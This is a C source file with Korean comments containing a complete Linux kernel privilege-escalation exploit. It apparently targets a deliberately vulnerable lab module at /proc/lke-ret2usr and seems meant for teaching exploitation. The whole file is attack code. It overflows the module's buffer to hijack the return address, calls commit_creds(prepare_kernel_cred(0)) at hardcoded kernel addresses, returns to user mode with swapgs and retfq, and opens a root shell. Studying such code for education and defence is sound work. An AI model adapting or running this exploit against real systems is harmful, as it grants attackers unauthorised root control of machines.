// gcc -o exploit exploit.c
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
struct task_struct;
struct cred;
static struct cred *(*prepare_kernel_cred)(struct task_struct *daemon) =
	(void *) 0xffffffff81081716;
static int (*commit_creds)(struct cred *new) =
	(void *) 0xffffffff8108157b;
/*
 * ret2usr 이후 스택으로 사용될 버퍼입니다.
 * __attribute__((aligned(16)))은 system() 함수가 정상 동작하기 위해 필요합니다.
 */
uint64_t dummy_stack[512] __attribute__((aligned(16)));
/* ret2usr에서 사용자 모드로 반환한 후 shell 함수가 실행됩니다. */
void shell(void)
{
	system("/bin/sh");
	_exit(0);
}
/* 커널 모드에서 실행되는 함수입니다. */
void ret2usr(void)
{
	/* RETF에서 사용할 Far Return 프레임을 정적으로 할당합니다. */
	static struct far_return_to_outer_ring_frame {
		void *rip;
		uint64_t cs;               /* 실제로는 하위 16비트만 사용됨 */
		void *rsp;
		uint64_t ss;               /* 실제로는 하위 16비트만 사용됨 */
	} frf = {
		.rip = &shell,             /* RETF에서 리턴할 함수 주소 */
		.cs = 0x33,                /* RETF 이후 CS 레지스터 값 */
		.rsp = dummy_stack + 512,  /* RETF 이후 스택 포인터 */
		.ss = 0x2b                 /* RETF 이후 SS 레지스터 값 */
	};
	volatile register uint64_t RSP asm("rsp");  /* RSP 레지스터를 변수로 씁니다. */
	commit_creds(prepare_kernel_cred(0));       /* 권한을 상승시킵니다. */
	RSP = (uint64_t)&frf;                       /* 스택 포인터를 Far Return 프레임에 위치시킵니다. */
	asm volatile(
		"cli\n\t"     /* 인터럽트로 인한 레이스 컨디션을 방지합니다. */
		"swapgs\n\t"  /* KernelGSBase에 저장된 주소를 GSBase와 교환합니다. */
		"retfq"       /* RETF 명령을 실행합니다. */
		:: "r" (RSP)  /* 컴파일러가 레지스터 변수를 제거하지 않도록 합니다. */
	);
}
int main(void)
{
	int fd;
	char payload[0x118];
	/* 취약한 모듈과 통신할 수 있는 가상 파일을 엽니다. */
	fd = open("/proc/lke-ret2usr", O_WRONLY);
	if (fd < 0) { perror("open"); return EXIT_FAILURE; }
	memset(payload, 'A', 0x110);
	/* 리턴주소를 ret2usr 함수로 덮습니다. */
	*(uint64_t *)(payload + 0x110) = (uint64_t)ret2usr;
	/* 익스플로잇을 실제로 수행합니다. */
	write(fd, payload, sizeof(payload));
	/* 익스플로잇이 성공했으면 write() 함수는 리턴하지 않습니다. */
	abort();
}